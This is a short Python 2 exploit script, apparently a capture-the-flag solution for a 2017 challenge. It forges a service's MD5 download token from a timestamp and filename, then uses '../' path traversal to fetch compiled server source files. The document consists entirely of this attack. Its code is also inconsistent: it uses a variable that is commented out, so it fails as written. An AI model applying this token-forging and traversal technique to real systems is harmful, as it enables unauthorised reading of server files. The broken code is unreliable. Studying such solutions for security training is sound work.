from __future__ import division
import hashlib
import requests
from datetime import datetime, timedelta

api_url = 'http://rfile.2017.teamrois.cn/api/download/{}/{}'

def totimestamp(dt, epoch=datetime(1970,1,1)):
    td = dt - epoch
    return (td.microseconds + (td.seconds + td.days * 86400) * 10**6) / 10**6

def gen_md5(filename):
    tstamp = datetime.now()
    tstamp = tstamp.replace(second=0, microsecond=0)
    tstamp = int(totimestamp(tstamp)) - 10800 + 60  # fix timezone
    plaintext = '{}{}'.format(tstamp, filename)
    md5 = hashlib.md5(plaintext).hexdigest()
    return md5

#init_file = '../__pycache__/__init__.cpython-35.pyc' => decompile using uncompyle6 (python3)
conf_file = '../__pycache__/conf.cpython-35.pyc'
download_url = api_url.format(gen_md5(init_file), init_file)
resp = requests.get(download_url)
print resp.text
#with open('__init__.pyc', 'wb') as f:
#    f.write(resp.content)
